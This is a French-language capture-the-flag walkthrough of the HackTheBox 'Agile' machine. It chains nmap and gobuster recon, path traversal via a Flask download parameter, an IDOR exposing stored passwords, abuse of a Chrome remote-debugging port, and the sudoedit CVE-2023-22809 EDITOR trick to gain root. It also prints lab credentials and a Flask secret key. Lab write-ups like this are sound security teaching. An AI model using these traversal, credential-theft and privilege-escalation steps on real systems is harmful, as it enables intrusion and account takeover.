# Agile - Medium

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-08 17:12 EST
Nmap scan report for 10.10.11.203
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.98 seconds
```

On va donc sur superpass.htb, on le rajoute à notre /etc/hosts, on lance un gobuster en tâche de fond ainsi qu’un sqlmap sur la page de login

```bash
[CRITICAL] all tested parameters do not appear to be injectable.
```

On teste aussi sur le register

```bash
[CRITICAL] all tested parameters do not appear to be injectable
```

On essaye alors à la création de mdp sur le site:

```bash
CRITICAL] all tested parameters do not appear to be injectable
```

Gobuster:

```bash
/download             (Status: 302) [Size: 249] [--> /account/login?next=%2Fdownload]
/static               (Status: 301) [Size: 178] [--> http://superpass.htb/static/]   
/vault                (Status: 302) [Size: 243] [--> /account/login?next=%2Fvault]
```

Quand on va sur [http://superpass.htb/download](http://superpass.htb/download) on tombe sur un file not found error de flask:

```bash
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/None'
```

```python
def download(): [Open an interactive python shell in this frame] 

    r = flask.request

    fn = r.args.get('fn')

    with open(f'/tmp/{fn}', 'rb') as f:

        data = f.read()

    resp = flask.make_response(data)

    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'

    resp.mimetype = 'text/csv'

    return resp
```

On fait alors:

```bash
http://superpass.htb/download?fn=../etc/passwd
```

Et on obtient le /etc/passwd ! Il y a edwards, corum et dev_admin

On tente alors avec plusieurs id_rsa:

```bash
http://superpass.htb/download?fn=../home/corum/.ssh/id_rsa
```

Pas possible d’avoir des fichiers, permission denied

On trouve ça dans le /etc/hosts de la machine:

```bash
127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile
```

Il faut essayer de trouver le code source du site

On trouve l’adresse du site sur la page download en erreur:

```bash
http://superpass.htb/download?fn=../app/app/superpass/app.py
```

On trouve alors un secret: 

```bash
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'
```

On voit aussi ça:

```bash
@blueprint.get('/vault/row/<id>')
@response(template_file='vault/partials/password_row.html')
@login_required
def get_row(id):
    password = password_service.get_password_by_id(id, current_user.id)

    return {"p": password}
```

En faisant une énumération des id on trouve ça:

```bash
hackthebox.com 0xdf 762b430d32eea2f12970
mgoblog.com 0xdf 5b133f7a6a1c180646cb
mgoblog corum 47ed1e73c955de230a1d
ticketmaster corum 9799588839ed0f98c211
agile corum sudo ssh -L 41829:localhost:41829 corum@10.10.11.203
```

Le dernier mdp fonctionne pour ssh en tant que corum ! 

Pas possible de sudo en tant que corum, on va lancer un linpeas pour essayer de récolter des infos

choses intéressantes:

```bash
/etc/systemd/system/superpass.service.bak
/app/app-testing/superpass
/etc/skel/
/usr/share/lintian/overrides/passwd
edwards  pts/0    10.10.16.2       15:59   10.00s  0.03s  0.02s mysql -u superpasstester -p
```

Cependant on voit que pas mal de process chrome tournent avec un qui a ce flag:

```bash
--remote-debugging-port=41829
```

Avec plus de recherches on trouve que :

```bash
Enable remote debugging mode over HTTP on the specified port (9222). This mode supports the functioning of the Interface Viewer and Identify tool to capture web controls, and allows for automated tests to run successfully on Google Chrome
```

On met en place un port forwarding:

```bash
ssh -L 41829:localhost:41829 corum@10.10.11.203
```

On consulte donc `chrome://inspect` et on met en place le remote debugger

On peut alors maintenant inspecter la page test.superpass.htb en local, on peut donc lire le mdp de edwards dans /vault

```bash
d07867c6267dcb5df0af
```

Par réflexe:

```bash
sudo -l 

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

On trouve ça dans config_test:

```bash
superpasstester:VUO8A2c2#3FnLq3*a9DX1U

mysql -u superpasstester -p
```

Il n’y a que les creds d’edwards dans cette database

On run linpeas à nouveau pour essayer de trouver un chemin mais rien de concret

En fait la version du sudo est vulnérable à cette CVE:

[https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc](https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc)

En executant ces commandes on devient root avec un listener:

```bash
export EDITOR="vim -- /app/venv/bin/activate"

sudo -u dev_admin sudoedit /app/config_test.json
```

La ligne qu’on rajoute sera executée en tant que root